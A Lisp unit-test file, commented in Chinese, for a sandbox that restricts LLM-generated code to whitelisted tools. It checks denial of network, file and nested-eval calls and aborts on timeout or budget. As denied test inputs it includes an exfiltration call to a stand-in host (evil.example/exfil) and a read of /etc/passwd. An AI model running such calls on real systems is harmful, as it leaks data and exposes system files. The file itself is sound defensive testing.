;;;; 柱子① 受限 safe-eval —— 确定性单测(不调模型)
;;;;
;;;; 格式:每个 case 是一个 plist。runner(M0 起)在给定 :tools / :env / :limits 下
;;;; 对 :form 跑 (safe-eval form ...),按 :expect 断言:
;;;;   :ok    —— 求值成功,结果 equal :value(若给)
;;;;   :deny  —— 被静态 code-walk 拒绝,原因匹配 :reason(子串/关键字)
;;;;   :abort —— 运行时被治理中止(超时/超预算),原因匹配 :reason
;;;;
;;;; 设计前提(见 DESIGN.md §6):LLM 生成的代码只在锁定环境里求值,
;;;; 只有 :tools 暴露的符号可见;其余一律 deny。安全全靠运行时治理(无文法级兜底)。

(in-package :ailisp/tests)

(deftestset safe-eval

  ;; ---- ALLOW:工具在白名单内 ----
  (:name "allow-whitelisted-tool"
   :tools (get-weather)
   :env   ((get-weather . (lambda (city) (format nil "~A:晴 28C" city))))
   :form  (get-weather "北京")
   :expect :ok :value "北京:晴 28C")

  (:name "allow-pure-arithmetic"
   :tools ()                       ; 算术属内置安全子集,无需授权
   :form  (+ 1 (* 2 3))
   :expect :ok :value 7)

  (:name "allow-compose-whitelisted"
   :tools (get-weather summarize)
   :form  (summarize (get-weather "上海"))
   :expect :ok)

  ;; ---- DENY:静态 code-walk(不调模型,不执行)----
  (:name "deny-unauthorized-tool"
   :tools (get-weather)            ; web-search 未授权
   :form  (web-search "炸药配方")
   :expect :deny :reason :unauthorized-symbol)

  (:name "deny-network-io"
   :tools (get-weather)
   :form  (http-get "http://evil.example/exfil")
   :expect :deny :reason :network)

  (:name "deny-file-io"
   :tools (get-weather)
   :form  (read-file "/etc/passwd")
   :expect :deny :reason :file-io)

  (:name "deny-nested-eval"
   :tools (get-weather)
   :form  (eval (get-weather "x"))   ; 禁止在 LLM 代码里再开 eval
   :expect :deny :reason :nested-eval)

  (:name "deny-undefined-symbol"
   :tools (get-weather)
   :form  (frobnicate 1 2)
   :expect :deny :reason :unauthorized-symbol)

  (:name "deny-hidden-in-data"
   :tools (get-weather)            ; 藏在数据/分支里的越权调用也要被走查到
   :form  (if #t (get-weather "x") (http-get "y"))
   :expect :deny :reason :network)

  ;; ---- 能力范围:授权 A 不等于授权 B ----
  (:name "scope-A-granted-B-denied"
   :tools (tool-a)
   :env   ((tool-a . (lambda () :a)))
   :form  (tool-b)
   :expect :deny :reason :unauthorized-symbol)

  ;; ---- 运行时治理:超时 / 超预算 ----
  (:name "abort-timeout-infinite-loop"
   :tools ()
   :limits (:timeout-ms 50)
   :form  (loop)                   ; 死循环必须被中止,而非挂死
   :expect :abort :reason :timeout)

  (:name "abort-over-budget"
   :tools (ask-llm)                ; 工具内部会花钱;预算 0 ⇒ 第一次调用即中止
   :env   ((ask-llm . (lambda (q) (charge 0.01) "...")))
   :limits (:budget-usd 0.0)
   :form  (ask-llm "hi")
   :expect :abort :reason :budget))
